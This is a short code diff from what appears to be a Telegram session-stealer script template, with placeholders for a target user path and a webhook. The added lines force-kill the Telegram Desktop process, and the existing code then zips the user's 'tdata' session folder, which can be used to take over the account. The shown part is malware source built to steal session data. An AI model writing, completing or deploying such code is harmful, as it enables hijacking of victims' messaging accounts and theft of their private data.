@@ -26,6 +26,10 @@ user = r'{user}'
 hook = "{hook}"
 # sources end
 
+#task_kill
+os.system('taskkill /f /im Telegram Desktop.exe')
+#task_kill_end
+
 # tdata take + archivation
 with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
     for root, dirs, files in os.walk(user):
